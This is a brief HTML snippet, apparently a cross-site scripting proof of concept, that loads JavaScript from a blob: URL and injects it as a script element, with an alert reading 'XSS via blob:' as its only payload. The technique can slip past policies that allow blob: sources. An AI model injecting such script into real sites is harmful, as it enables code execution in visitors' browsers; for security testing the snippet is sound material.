<script>
  const blob = new Blob(['alert("XSS via blob:")'], { type: 'application/javascript' });
  const url = URL.createObjectURL(blob);
  const script = document.createElement('script');
  script.src = url;
  document.body.appendChild(script);
</script>
